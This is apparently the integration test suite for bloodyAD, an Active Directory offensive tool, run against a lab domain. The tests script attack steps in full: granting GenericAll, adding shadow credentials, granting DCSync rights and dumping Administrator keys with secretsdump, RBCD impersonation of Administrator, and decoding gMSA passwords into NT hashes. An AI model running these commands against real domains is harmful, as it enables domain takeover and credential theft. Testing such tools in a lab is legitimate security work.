import unittest, subprocess, pathlib, json, os, re, binascii
from bloodyAD import md4


class TestModules(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        conf = json.loads((pathlib.Path(__file__).parent / "secrets.json").read_text())
        cls.domain = conf["domain"]
        cls.rootDomainNamingContext = ",".join(
            ["DC=" + subdomain for subdomain in cls.domain.split(".")]
        )
        cls.host = conf["pdc"]["ip"]
        cls.hostname = conf["pdc"]["hostname"]
        cls.admin = {
            "username": conf["admin_user"]["username"],
            "password": conf["admin_user"]["password"],
        }
        cls.toTear = []
        cls.env = os.environ.copy()
        cls.bloody_prefix = [
            "python3",
            "bloodyAD.py",
            "--host",
            cls.hostname,
            "-d",
            cls.domain,
            "--dc-ip",
            cls.host,
        ]
        cls.user = {"username": "stan.dard", "password": "Password1123!"}

    def test_01AuthCreateUser(self):
        # Add User
        self.createUser(self.admin, self.user["username"], self.user["password"])
        username_pass = ["-u", self.user["username"], "-p"]

        cleartext = username_pass + [self.user["password"]]
        ntlm = username_pass + [
            f":{md4.MD4(self.user['password'].encode('utf-16le')).hexdigest()}"
        ]

        self.launchProcess(
            [
                "getTGT.py",
                "-dc-ip",
                self.host,
                f"{self.domain}/{self.admin['username']}:{self.admin['password']}",
            ]
        )
        self.env["KRB5CCNAME"] = f"{self.admin['username']}.ccache"
        krb = ["-k"]

        self.launchProcess(
            [
                "certipy",
                "req",
                "-target",
                self.host,
                "-ca",
                "bloody-MAIN-CA",
                "-template",
                "User",
                "-p",
                self.admin["password"],
                "-debug",
                "-u",
                f"{self.admin['username']}@{self.domain}",
                "-out",
                "bloodytest",
            ],
            ignoreErr=True,
        )

        self.launchProcess(
            [
                "openssl",
                "pkcs12",
                "-in",
                "bloodytest.pfx",
                "-out",
                "bloodytest.pem",
                "-nodes",
                "-passin",
                "pass:",
            ]
        )
        cert = ["-c", ":bloodytest.pem"]

        auths = [cleartext, ntlm, krb, cert]
        for auth in auths:
            for sec_state in ["", "-s "]:
                self.launchProcess(
                    self.bloody_prefix
                    + auth
                    + (
                        sec_state + "get object Administrator --attr sAMAccountName"
                    ).split(" ")
                )

    def test_02SearchAndGetChildAndGetWritable(self):
        self.launchBloody(
            self.user,
            ["get", "children", "--target", "OU=Domain Controllers,DC=bloody,DC=corp"],
        )

        self.launchBloody(
            self.user,
            [
                "get",
                "search",
                "--filter",
                "(cn=Administrator)",
                "--attr",
                "description",
            ],
        )

        writableAll = self.launchBloody(self.user, ["get", "writable"])
        writableUserWrite = self.launchBloody(
            self.user, ["get", "writable", "--otype", "USER", "--right", "WRITE"]
        )
        self.assertIn(writableUserWrite, writableAll)

        self.assertRegex(
            self.launchBloody(self.user, ["get", "membership", self.user["username"]]),
            "Domain Users",
        )
        self.assertRegex(
            self.launchBloody(
                self.user, ["get", "membership", self.user["username"], "--no-recurse"]
            ),
            "No direct group membership",
        )

    def test_03UacOwnerGenericShadowGroupPasswordDCSync(self):
        slave = {"username": "slave", "password": "Password1243!"}
        # Tries another OU
        ou = "CN=FOREIGNSECURITYPRINCIPALS," + self.rootDomainNamingContext
        self.createUser(self.admin, slave["username"], slave["password"], ou=ou)
        self.launchBloody(
            slave,
            [
                "get",
                "object",
                f"CN={slave['username']},{ou}",
                "--attr",
                "distinguishedName",
            ],
        )

        # GenericAll
        self.launchBloody(
            self.admin,
            ["add", "genericAll", slave["username"], self.user["username"]],
        )
        self.toTear.append(
            (
                self.removeGenericAll,
                self.user,
                self.user["username"],
                slave["username"],
            )
        )

        # SetUAC
        self.launchBloody(
            self.user, ["add", "uac", slave["username"], "-f", "DONT_REQ_PREAUTH"]
        )
        self.assertRegex(
            self.launchBloody(
                self.user,
                [
                    "get",
                    "object",
                    slave["username"],
                    "--attr",
                    "UserAccountControl",
                ],
            ),
            "DONT_REQ_PREAUTH",
        )
        self.launchBloody(
            self.user,
            ["remove", "uac", slave["username"], "-f", "DONT_REQ_PREAUTH"],
        )

        # SetOwner
        self.launchBloody(
            self.user, ["set", "owner", slave["username"], self.user["username"]]
        )
        self.assertRegex(
            self.launchBloody(
                self.user,
                [
                    "get",
                    "object",
                    slave["username"],
                    "--attr",
                    "ntSecurityDescriptor",
                    "--resolve-sd",
                ],
                doPrint=False,
            ),
            f'Owner: {self.user["username"]}',
        )

        # Shadow
        outfile1 = "shado_cred"
        out_shado1 = self.launchBloody(
            self.user,
            ["add", "shadowCredentials", slave["username"], "--path", outfile1],
        )
        outfile2 = "shado_cred2"
        self.launchBloody(
            self.user,
            ["add", "shadowCredentials", slave["username"], "--path", outfile2],
        )
        id_shado1 = re.search("sha256 of RSA key: (.+)", out_shado1).group(1)

        self.launchBloody(
            self.user,
            ["remove", "shadowCredentials", slave["username"], "--key", id_shado1],
        )

        self.launchBloody(self.user, ["remove", "shadowCredentials", slave["username"]])
        # Delete the files with '.ccache' extension
        for file in [outfile1, outfile2]:
            ccache_file = f"{file}.ccache"
            if os.path.exists(ccache_file):
                os.remove(ccache_file)
        # Group
        self.launchBloody(
            self.admin, ["add", "genericAll", "IIS_IUSRS", self.user["username"]]
        )
        self.launchBloody(
            self.user, ["add", "groupMember", "IIS_IUSRS", slave["username"]]
        )
        self.launchBloody(
            self.user, ["remove", "groupMember", "IIS_IUSRS", slave["username"]]
        )

        # Password
        self.launchBloody(
            slave,
            [
                "set",
                "password",
                slave["username"],
                "Password124!",
                "--oldpass",
                slave["password"],
            ],
        )
        self.launchBloody(
            self.user, ["set", "password", slave["username"], slave["password"]]
        )

        # DCsync
        self.launchBloody(
            self.admin,
            ["add", "genericAll", self.rootDomainNamingContext, self.user["username"]],
        )
        self.launchBloody(self.user, ["add", "dcsync", slave["username"]])
        import time
        time.sleep(120)
        self.assertRegex(
            self.launchProcess(
                [
                    "secretsdump.py",
                    "-just-dc-user",
                    "BLOODY/Administrator",
                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
                ]
            ),
            "Kerberos keys grabbed",
        )
        self.launchBloody(self.user, ["remove", "dcsync", slave["username"]])
        time.sleep(120)
        self.assertNotRegex(
            self.launchProcess(
                [
                    "secretsdump.py",
                    "-just-dc-user",
                    "BLOODY/Administrator",
                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
                ]
            ),
            "Kerberos keys grabbed",
        )
        self.launchBloody(
            self.admin,
            [
                "remove",
                "genericAll",
                self.rootDomainNamingContext,
                self.user["username"],
            ],
        )

    def test_04ComputerRbcdGetSetAttribute(self):
        hostname = "test_pc"
        self.launchBloody(
            self.user,
            [
                "add",
                "computer",
                hostname,
                "Password1234!",
                "--ou",
                "CN=COMPUTERS," + self.rootDomainNamingContext,
            ],
        )
        self.toTear.append(
            (self.launchBloody, self.admin, ["remove", "object", hostname + "$"])
        )

        hostname2 = "test_pc2"
        hostname2_pass = "Password1235!"
        self.launchBloody(self.user, ["add", "computer", hostname2, hostname2_pass])
        self.toTear.append(
            (self.launchBloody, self.admin, ["remove", "object", hostname2 + "$"])
        )
        self.launchBloody(self.user, ["add", "rbcd", hostname + "$", hostname2 + "$"])

        hostname3 = "test_pc3"
        self.launchBloody(self.user, ["add", "computer", hostname3, "Password1236!"])
        self.toTear.append(
            (self.launchBloody, self.admin, ["remove", "object", hostname3 + "$"])
        )
        self.launchBloody(self.user, ["add", "rbcd", hostname + "$", hostname3 + "$"])

        # Test if rbcd correctly removed and doesn't remove all rbcd rights
        self.launchBloody(
            self.user, ["remove", "rbcd", hostname + "$", hostname3 + "$"]
        )
        self.assertNotRegex(
            self.launchBloody(
                self.user,
                [
                    "get",
                    "object",
                    hostname + "$",
                    "--resolve-sd",
                    "--attr",
                    "msDS-AllowedToActOnBehalfOfOtherIdentity",
                ],
            ),
            hostname3 + "$",
        )

        del self.env["KRB5CCNAME"]
        self.assertRegex(
            self.launchProcess(
                [
                    "getST.py",
                    "-spn",
                    f"HOST/{hostname}",
                    "-impersonate",
                    "Administrator",
                    "-dc-ip",
                    self.host,
                    f"{self.domain}/{hostname2}$:{hostname2_pass}",
                ],
                False,
            ),
            "Saving ticket in",
        )

        # SetAttr
        self.launchBloody(
            self.admin,
            ["add", "genericAll", hostname + "$", self.user["username"]],
        )
        self.launchBloody(
            self.user,
            [
                "set",
                "object",
                hostname + "$",
                "servicePrincipalName",
                "-v",
                "TOTO/my.local.domain",
                "-v",
                "TATA/imaginary.unicorn",
            ],
        )

    def test_05ComputerRbcdGetSetAttribute(self):
        managedPassword_raw = "01000000240200001000120114021c024dafdec827d690c71f64bd4d88a8351d23bdfa8eca206fc57d63450908c698f46a4902523d11614839b95e522c59bc78ae43ee869c25678052f4eca85010842b9c0e2e3c1d462cd839eaa83709e01452171218577e68cad4de9576c4a94b47da96f6a56c15bfa1a0a02769e6663c6bef47601d3079e3514d0a01e642a33c9bf4d5266e355d4511f421359d767355b8557363653d3adfe7b6950c1e443171c8b1b55249421bc1379e94abefcdd955ed2f1d6689f1b1095ef6e73fdbc853c4fe9c5dd3e0dc5ff51989ed2770d06b28f8cd2b92a61721e002b636e1eef1a53488b168af5b97081e3b75a4393a4b2ff614e3ae5ebeddde044bad2c5afe65b257f63a0000d22a8a7805c89cf00f66f3751c5167fa9066161ed146cb100465b56b5cb8719fc3b4ff5c0dc4f552824562eb7de0564bf1e2a2f542ed69a0de456dfdffcad0127ba1c3e9466ea8947737271cac6390167a590c2b6de8e72fe9d2b7d65a39f7419d29f8f248e988cc58a2451df60fa3d585c8828ff873fa19b07efea628a42a53b3e8cc8796035976760456d464a2ea817e14afd04a1e8ec0ec50df80381dbc1e3385297b0034f3a883b5ca5e515d21241b4e2c00bcf62c05ca52a58494fec4f0c7a06ebcfd865879a0bc57567fd3035d8207b2227c8c42fe5550dc96605726cb9c7c8acdfb638e57402e741d563aea4f7ff702416287a5903f379ca0c4eaa37c0000143b80910310000014ddafde02100000"
        managedPassword_nthash = "95f2a1e85bae294a9a3d8b32dffee725"

        managedPassword_raw = binascii.unhexlify(managedPassword_raw.encode())
        from bloodyAD.formatters.cryptography import MSDS_MANAGEDPASSWORD_BLOB

        managedPassword_blob = MSDS_MANAGEDPASSWORD_BLOB(managedPassword_raw)
        self.assertEqual(managedPassword_blob.getData(), managedPassword_raw)
        self.assertEqual(managedPassword_blob.toNtHash(), managedPassword_nthash)

    def test_06AddRemoveGetDnsRecord(self):
        self.launchBloody(
            self.user,
            [
                "add",
                "dnsRecord",
                "test.domain",
                "8.8.8.8",
                "--dnstype",
                "A",
                "--ttl",
                "50",
            ],
        )

        self.assertRegex(
            self.launchBloody(
                self.user,
                ["get", "dnsDump", "--zone", self.domain],
            ),
            "test.domain",
        )

        self.launchBloody(
            self.user,
            ["remove", "dnsRecord", "test.domain", "8.8.8.8", "--ttl", "50"],
        )

        self.assertNotRegex(
            self.launchBloody(
                self.user,
                ["get", "dnsDump", "--zone", self.domain],
            ),
            "test.domain",
        )

    def createUser(self, creds, usr, pwd, ou=None):
        args = ["add", "user", usr, pwd]
        if ou:
            args += ["--ou", ou]
        self.launchBloody(creds, args)
        self.toTear.append((self.launchBloody, creds, ["remove", "object", usr]))

    def removeGenericAll(self, creds, identity, target):
        self.launchBloody(creds, ["remove", "genericAll", target, identity])
        self.assertNotRegex(
            self.launchBloody(
                creds,
                [
                    "get",
                    "object",
                    target,
                    "--attr",
                    "ntSecurityDescriptor",
                    "--resolve-sd",
                ],
                doPrint=False,
            ),
            '"Trustee": "' + identity,
        )

    @classmethod
    def tearDownClass(cls):
        if not len(cls.toTear):
            return
        try:
            func = cls.toTear.pop()
            if len(func) > 1:
                func[0](*func[1:])
            else:
                func[0]()
        except Exception as e:
            raise e
        finally:
            cls.tearDownClass()

    def launchBloody(self, creds, args, isErr=True, doPrint=True):
        cmd_creds = ["-u", creds["username"], "-p", creds["password"]]
        return self.launchProcess(self.bloody_prefix + cmd_creds + args, isErr, doPrint)

    def launchProcess(self, cmd, isErr=True, doPrint=True, ignoreErr=False):
        out, err = subprocess.Popen(
            cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE, env=self.env
        ).communicate()
        out = out.decode()
        if not ignoreErr:
            self.assertFalse(isErr and err, self.printErr(err.decode(), cmd))
        out += "\n" + err.decode()
        if doPrint:
            print(out)
        return out

    def printErr(self, err, cmd):
        err = err.replace("\n", "\n ")
        self.err = f"here is the error output ->\n\n {cmd}\n{err}"
        return self.err


if __name__ == "__main__":
    unittest.main(failfast=True)
